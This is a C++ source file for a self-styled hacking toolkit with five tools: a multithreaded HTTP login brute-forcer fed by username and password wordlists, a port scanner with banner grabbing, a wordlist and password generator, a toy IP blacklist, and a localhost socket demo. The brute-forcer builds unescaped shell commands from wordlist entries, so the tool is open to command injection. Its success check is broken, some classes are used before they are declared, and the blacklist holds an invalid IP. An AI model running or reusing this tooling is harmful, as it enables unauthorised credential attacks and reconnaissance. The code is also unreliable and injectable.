#include <iostream>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <sstream>
#include <algorithm>
#include <map>
#include <cstring>
#include <atomic>
#include <fstream>
#include <mutex>
#include <chrono>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <sys/socket.h>
#include <limits>
#include <curl/curl.h>
using namespace std;
using Lock =  lock_guard<mutex>;
mutex print_mutex;

class Dread{
    private:
        vector<string> usernames;
        vector<string> passwords;
        string targetURL;
        atomic<bool> found = false;
    public:
        void banner(){
    cout << "\033[38;5;94m";
    cout << R"(
############################################
#██████╗ ██████╗ ███████╗ █████╗ ██████╗   #
#██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗  #
#██║  ██║██████╔╝█████╗  ███████║██║  ██║  #
#██║  ██║██╔══██╗██╔══╝  ██╔══██║██║  ██║  #
#██████╔╝██║  ██║███████╗██║  ██║██████╔╝  #
#╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝   #
#                                          #
#              DREAD V1.1                  #
#    By Xpl01t | www.XploitPower.com       #
############################################ 
)"<< "\033[0m" << endl;
}
        void loadWordlists(){
            cout << "[?]Enter the target URL : ";
            cin >> targetURL;

            string user, pass;
            cout << "[+]Enter the path of usernames wordlist: ";
            cin >> user;
            cout << "[+]Enter the path of passwords wordlist: ";
            cin >> pass;

            usernames.clear();
            passwords.clear();
            
            ifstream uFile(user);
            string line;
            ifstream pFile(pass);

            if(!uFile.is_open() && !pFile.is_open()){
                cerr << "[-]Can't open the wordlist." << endl;
                return;
            }

            while (getline(uFile, line)){
                usernames.push_back(line);
            }
            
            while (getline (pFile, line)){
                passwords.push_back(line);
            }

            cout << "\033[1;33m[++]Wordlists has been loaded successfully!\033[0m" << endl;
            sleep(1);
        }

        bool trylogin(const string& user, const string& pass) const {
            string postField = "username=" + user + "&password=" + pass;
            string command = "curl -s -d \"" + postField + "\" -X POST \"" + targetURL + "\"";

            FILE* pipe = popen(command.c_str(), "r");
            if (!pipe) return false;

            char buffer[128];
            string result = "";
            while (fgets(buffer, sizeof(buffer), pipe) != nullptr){
                result += buffer;
            }

            pclose(pipe);

            if(result.find("Invalid username of password")){
                return false;
            }

            return (result.find("200") != string::npos);
        }
        void bruteforce(){

            vector<thread> threads;

            for(const string& user : usernames){
                for(const string& pass : passwords){
                    if(found.load()) break;

                    threads.emplace_back([this, user, pass](){
                        if(found.load()) return;

                        bool success = trylogin(user, pass);

                        Lock lock(print_mutex);
                        cout << "[*]Trying " << user << ":" << pass << endl;



                        if(success){
                            found.store(true);
                            Lock lock(print_mutex);
                            cout << "\033[32m[+]Dread successed: username:" << user << "|password:" << pass << endl;
                        }
                        else{
                            Lock lock(print_mutex);
                             
                        }
                    });
                    
                   
                }
                if (found.load()) break;
            }

            for(auto& t : threads){
                if(t.joinable()) t.join();
            }
            if(!found.load()){
                cerr << "\033[31m[-]Dread has failed.." << endl;
            }
            
        }
        void run(){
            banner();
            loadWordlists();
            bruteforce();

        }
};

class Aegis{
    private:
        vector<string> blackListsIp = {
            "192.168.1.100",
            "10.0.0.5",
            "123.456.78.9"
        };
        string ip;
    public:
        void banner(){
            cout << "\033[96m";
            cout << R"( 
######################################
# █████╗ ███████╗ ██████╗ ██╗███████╗#
#██╔══██╗██╔════╝██╔════╝ ██║██╔════╝#
#███████║█████╗  ██║  ███╗██║███████╗#
#██╔══██║██╔══╝  ██║   ██║██║╚════██║#
#██║  ██║███████╗╚██████╔╝██║███████║#
#╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚══════╝#
#                                    #
#            Aegis v1.0              #
# By Xpl01t | www.XploitPower.com    #
######################################
)";
            cout << "\033[0m";
        }

        void takeIp(){
            cout << "[?]Enter the Ip address: ";
            cin >> ip;
            sleep(1);
        }

        bool isBlackListed(const string& ip){
            for(const auto& blockedIp : blackListsIp){
                if (blockedIp == ip){
                    return true;
                }
            }
            return false;
        }
        void saveBlockedIp(const string& ip){
            ofstream log("logs/aegis_logs.txt", ios::app);
            log << "[AEGIS] ▶ [BLOCKED] " << ip << endl;
            cout << "[*]The ip has been saved in logs/aegis_logs.txt" << endl;

        }

        void checkConnection(const string& ip){
            if(isBlackListed(ip)){
                cout << "\033[31m[-]Connection from " << ip << " is blocked!\033[0m" << endl;
                saveBlockedIp(ip);
            }
            else{
                cout << "\033[32m[+]Connection from " << ip << " is allowed!\033[0m" << endl;
            }
        }

        void run(){
            banner();
            takeIp();
            checkConnection(ip);
        }
};

class Hexer{
    public:
        void banner(){
            cout << "\033[35m";
            cout << R"(
##########################################
#██╗  ██╗███████╗██╗  ██╗███████╗██████╗ #
#██║  ██║██╔════╝╚██╗██╔╝██╔════╝██╔══██╗#
#███████║█████╗   ╚███╔╝ █████╗  ██████╔╝#
#██╔══██║██╔══╝   ██╔██╗ ██╔══╝  ██╔══██╗#
#██║  ██║███████╗██╔╝ ██╗███████╗██║  ██║#
#╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝#
#                                        #
#            Hexer v1.1                  #
#    By Xpl01t | www.XploitPower.com     #
##########################################
)" << endl;
            cout << "\033[0m";
        }
        
        void CLI(){
            Wordlists_generator gen;
            Passwords_generator pas;
            int choice;
            sleep(1);

            cout << "[1]. Wordlists generator." << endl;
            cout << "[2]. Passwords generator." << endl;
            cout << "[99]. Exit." << endl;
            cout << "[?]. Enter your choice: ";
            cin >> choice;

            switch (choice){
                case 1 :
                    gen.Wordlists_runner();
                    break;
                case 2 : 
                    pas.Pass_run();
                    break;
                case 99:
                    cout << "Exiting..";
                    break;
                default:
                    cerr << "\033[31mInvalid number\033[0m" << endl;
                    break; 
            }
            
        }
        class Wordlists_generator{
            private:
                vector<string> words;
                vector<string> combos;
            public:
                void takeWords(){
                    words.clear();

                    string input;
                    cout << "[?]Enter words (anything, space seperated): ";
                    getline(cin, input);

                    stringstream ss(input);
                    string token;
                    while (ss >> token){
                        words.push_back(token);
                    }
                }
                
                void combinations(const vector<string>& words){
                    combos.clear();
                    for(size_t i=0; i < words.size(); i++){
                        for(size_t j=0; j < words.size(); j++){
                            if (i != j ){
                                combos.push_back(words[i] + words[j]);
                            }
                        }
                    }
                }

                void saveWordlist(){
                    string fileName;

                    cout << "[?]Enter the name of the file(no extension): ";
                    getline(cin, fileName);

                    string fullPath = "wordlists/" + fileName + ".txt";

                    ofstream file(fullPath);

                    if(!file.is_open()){
                        cerr << "[-]Cant open the file." << endl;
                        return;
                    }

                    for (const auto& combo : combos){
                        file << combo << endl;
                    }

                    file.close();
                    sleep(1);
                    cout << "\033[35m[+]Wordlist has been saved successfully in " << fullPath << "\033[0m" << endl;
                }
                
                void Wordlists_runner(){
                    cin.ignore(numeric_limits<streamsize>::max(), '\n');
                    takeWords();
                    combinations(words);
                    saveWordlist();
                }
        };
        class Passwords_generator {
            private:
                int length;
                string password ;
                string use;
            public:
                void makePasswords(){
                    static const char randNum[] = 
                    "0123456789"
                    "./*@#&$"
                    "abcdefghijklmnopqrstuvwxyz"
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

                    int size = sizeof(randNum) - 1;
                    cout << "[?]Enter the length of the password: ";
                    cin >> length;

                    srand(time(0));

                    //use of password
                    cin.ignore();
                    cout << "[?]For what this password: ";
                    getline(cin, use);

                    password = "";
                    for(int i = 0; i < length; i++){
                        password += randNum[rand() % size];
                    }
                    cout << "\033[92m[+] Your password has been saved successfully in passwords folder.\033[0m" << endl;
                }

                void savePassword(){
                    ofstream file("passwords/passwords.txt", ios::app);
                    file << use << ": " << password << endl;
                    file.close();
                }

                void Pass_run(){
                    makePasswords();
                    savePassword();
                }
        };
        void mainRun(){
            banner();
            CLI();

        }
};        

class Stry{
    private:
        string ip;
        vector<int> ports = {20, 21, 22, 23, 25, 53, 67, 69, 80, 110, 119, 
            123, 135, 137, 138, 139, 143, 161, 194, 443, 445, 465, 993, 
            995, 3306, 3389, 5900, 6379, 8080};

        map<int, string> services = {
            {20, "FTP-DATA"}, {21, "FTP"}, {22, "SSH"}, {23, "TELNET"}, {25, "SMTP"},
            {53, "DNS"}, {67, "DHCP"}, {69, "TFTP"}, {80, "HTTP"}, {110, "POP3"},
            {119, "NNTP"}, {123, "NTP"}, {135, "RPC"}, {137, "NETBIOS-NS"},
            {138, "NETBIOS-DGM"}, {139, "NETBIOS-SSN"}, {143, "IMAP"}, {161, "SNMP"},
            {194, "IRC"}, {443, "HTTPS"}, {445, "SMB"}, {465, "SMTPS"}, {993, "IMAPS"},
            {995, "POP3S"}, {3306, "MYSQL"}, {3389, "RDP"}, {5900, "VNC"}, 
            {6379, "REDIS"}, {8080, "HTTP-PROXY"}
        };

        vector<tuple <int, string, string>> results;
        
        
    public:
        void banner(){
            cout << "\033[36m";
            cout << R"(
####################################
#███████╗████████╗██████╗ ██╗   ██╗#
#██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝#
#███████╗   ██║   ██████╔╝ ╚████╔╝ #
#╚════██║   ██║   ██╔══██╗  ╚██╔╝  #
#███████║   ██║   ██║  ██║   ██║   #
#╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   #
#                                  #
#            Stry v1.2             #
# By Xpl01t | www.XploitPower.com  #
####################################           
)";         
            cout << "\033[0m";
        }

        void takeIp(){
            cout << "[?]Enter target Ip: ";
            cin >> ip;
            sleep(1);
            
        }

        void scanPort(int port){
            
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if(sock < 0){
                cerr << "[-]Sock creating failed." << endl;
            }

                sockaddr_in addr{};
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

                if(inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) <= 0){
                    cerr << "\033[31m[-]Invalid IP address format.\033[0m" << endl;
                    return;
                }

                struct timeval timeout;
                timeout.tv_sec = 1;
                timeout.tv_usec = 0;
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));

                int result = connect (sock, (sockaddr*)&addr, sizeof(addr));
                

                string status = (result == 0)? "open" : "closed";
                string version = "";

                if(status == "open"){
                    char buffer[1024] = {0};
                    recv(sock, buffer, sizeof(buffer), 0);
                    version = string(buffer);
                    
                }

                lock_guard<mutex> lock(print_mutex);
                results.push_back({port, status, version});
                close(sock);
             
        }
        void scanPorts(){
            auto start = chrono::steady_clock::now();
            cout << "[*]Scanning " << ip << ".." << endl;

            vector<thread> threads;

            for(int port : ports){
                threads.emplace_back(&Stry::scanPort, this, port);
                this_thread::sleep_for(chrono::milliseconds(10));
            }

            for(auto& t : threads){
                t.join();
            }

            sort(results.begin(), results.end());

            for(const auto& [port, status, version] : results){
                string color = (status == "open") ? "\033[32m" : "\033[31m";
                string service = services.count(port)? services[port] : "UNKNOWN";

                cout << "[SCAN] ▶ " << color << "Port " 
                                    << port << "/tcp" 
                                    << "(" << service << ")" 
                                    << ": " << status <<  endl;
                if(status == "open" && !version.empty()){
                    cout << "       [VERSION] ▶ " << version ;
                }
                cout << "\033[0m";
            }


            auto end = chrono::steady_clock::now();
            auto duration_ms = chrono::duration_cast<chrono::milliseconds>(end - start).count();

            cout << "[+]Scan Completed in \033[1m" << duration_ms << " ms!\033[0m" << endl;
        }

        void run(){
            banner();
            takeIp();
            scanPorts();
            
            
        }
};

class Bony_Stony{
    public:
        class Bony{
            public:
                void bony_banner(){
                    cout << "\033[38;5;46m";
                    cout << R"(
#######################################                 
#██████╗  ██████╗ ███╗   ██╗██╗   ██╗ # 
#██╔══██╗██╔═══██╗████╗  ██║╚██╗ ██╔╝ # 
#██████╔╝██║   ██║██╔██╗ ██║ ╚████╔╝  # 
#██╔══██╗██║   ██║██║╚██╗██║  ╚██╔╝   # 
#██████╔╝╚██████╔╝██║ ╚████║   ██║    # 
#╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝    #                     
#                                     #
#            Bony v1.0                #
#   By Xpl01t | www.XploitPower.com   #
#######################################                     
)";
                    cout << "\033[0m";
                }

                void listener(){
                    cout << "[*Bony]Start listening..." << endl;
                }
                void connect_os(){
                    int sock = socket( AF_INET, SOCK_STREAM, 0);
                    if (sock == -1){
                        cerr << "[-]Failed to create a socket." << endl;
                        return;
                    }

                    struct sockaddr_in serveraddr;
                    serveraddr.sin_family = AF_INET;
                    serveraddr.sin_port = htons(4444);
                    inet_pton(AF_INET, "127.0.0.1", &serveraddr.sin_addr);

                    if (connect(sock, (struct sockaddr*)&serveraddr, sizeof(serveraddr)) == -1){
                        cerr << "\033[31m[-] Connection failed.\033[0m" << endl;
                        close(sock);
                        return;
                    }

                    cout << "\033[33m[+]Connected to Stony.\033[0m" << endl;

                    const char* message = "hello from bony!, the password is 13534";
                    send(sock, message, strlen(message), 0);

                    close(sock);

                    
                }

            };
        class Stony{
            public:
                void Stony_banner(){
                    cout << "\033[38;5;46m";
                    cout << R"(
###############################################                    
#███████╗████████╗ ██████╗ ███╗   ██╗██╗   ██╗#
#██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║╚██╗ ██╔╝#
#███████╗   ██║   ██║   ██║██╔██╗ ██║ ╚████╔╝ #
#╚════██║   ██║   ██║   ██║██║╚██╗██║  ╚██╔╝  #
#███████║   ██║   ╚██████╔╝██║ ╚████║   ██║   #
#╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   #                    
#                                             #
#                 Stony v1.0                  #
#       By Xpl01t | www.XploitPower.com       #
###############################################                      
)";
                    cout << "\033[0m";
                }
                
                void listener(){
                    int server_fd, new_sock;
                    struct sockaddr_in adress;
                    int opt = 1;
                    int addrlen = sizeof(adress);
                    char buffer[1024] = {0};

                    server_fd = socket(AF_INET, SOCK_STREAM, 0);
                    if(server_fd == 0){
                        cerr << "\033[31m[-]Socket creation failed.\033[0m" << endl;
                        return;
                    }
                    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR , &opt, sizeof(opt));
                    setsockopt(server_fd, SOL_SOCKET, SO_REUSEPORT , &opt, sizeof(opt));

                    adress.sin_family = AF_INET;
                    adress.sin_port = htons(4444);
                    inet_pton(AF_INET, "127.0.0.1", &adress.sin_addr);

                    if(bind(server_fd, (struct sockaddr* )&adress, sizeof(adress)) < 0){
                        cerr << "\033[31m[-]bind failed.\033[0m" << endl;
                        return;
                    }

                    if(listen(server_fd, 3) < 0){
                        cerr << "\033[31m[-]Listen failed.\033[0m" << endl;
                        return;
                    }

                    cout << "[Stony] Listening on port 4444.." << endl;

                    new_sock = accept(server_fd, (struct sockaddr *)&adress, (socklen_t*)&addrlen);
                    if(new_sock < 0){
                        cerr << "\033[31m[-]Accepting failed" << endl;
                    }

                    cout << "[Stony] Connection received from Bony!" << endl;

                    int valread = read(new_sock, buffer, 1024);
                    if(valread > 0){
                        cout << "[Bony] Data received :\n" << buffer << endl;
                    }
                    else{
                        cout << "[Bony] No data received." << endl;
                    }
                    

                    close(new_sock);
                    close(server_fd);
                }
            };
        void run(){
            Bony b;
            Stony s;
            
            thread strony_thread([&](){
                s.Stony_banner();
                sleep(1);
                s.listener();
            });
            sleep(2);

            cout << "[+] Press [Enter] key to continue to Bony...";
            cin.ignore();
            cin.get();

            b.bony_banner();
            sleep(1);
            b.listener();
            b.connect_os();
            sleep(1);
            
            strony_thread.join();
        }
};

void displaybanner(){
    cout << "\033[1;31m";
    cout << R"(

##############################################################################################
#██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗    ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ #
#╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝    ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗#
# ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║       ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝#
# ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║       ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗#
#██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║       ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║#
#╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝       ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝#
#                                                                                            #
#                             By Xpl01t | www.XploitPower.com                                #
#                                                                                            #
##############################################################################################
)" << endl;
    cout << "\033[0m";

}
int main(){
 
    bool run = true;
    Dread dread;
    Aegis aegis;
    Hexer hexer;
    Stry stry;
    Bony_Stony bs;
    
    while(run){
        bool toolrun = false;
        system("clear");
        displaybanner();
        int choice;
        cout << "\033[38;5;94m[1]. Dread.\033[0m" << endl;
        cout << "\033[36m[2]. Stry.\033[0m" << endl;
        cout << "\033[35m[3]. Hexer.\033[0m" << endl;
        cout << "\033[96m[4]. Aegis.\033[0m" << endl;
        cout << "\033[38;5;46m[5]. Bony & Stony.\033[0m" << endl;
        cout << "\033[31m[99]. Exit.\033[0m" << endl;
        cout << "[?]Enter your choice(1-99): ";
        
        cin >> choice;
        sleep(1);
        //system("clear");
        switch (choice)
        {
            case 1:
                system("clear");
                dread.run();
                toolrun = true;
                break;
            case 2:
                system("clear");
                stry.run();
                toolrun = true;
                break;
            case 3:
                system("clear");
                hexer.mainRun();
                toolrun = true;
                break;
            case 4:
                system("clear");
                aegis.run();
                toolrun = true;
                break;
            case 5:
                system("clear");
                bs.run();
                toolrun = true;
                break;
            case 99:
                cout << "exiting.." << endl;
                run = false;
                break;

            default:
                cerr << "\033[31mInvalid number\033[0m" << endl;
                break;  
        }

        sleep(1);
        if(toolrun){
            string again;
            cout << endl << "\033[33m[?]Do you want back to CLI?[y/n]: \033[0m";
            cin >> again;
            if( again != "y" && again != "Y"){
                run = false;
                
            }
            
            sleep(1);
            
        }
    }

}
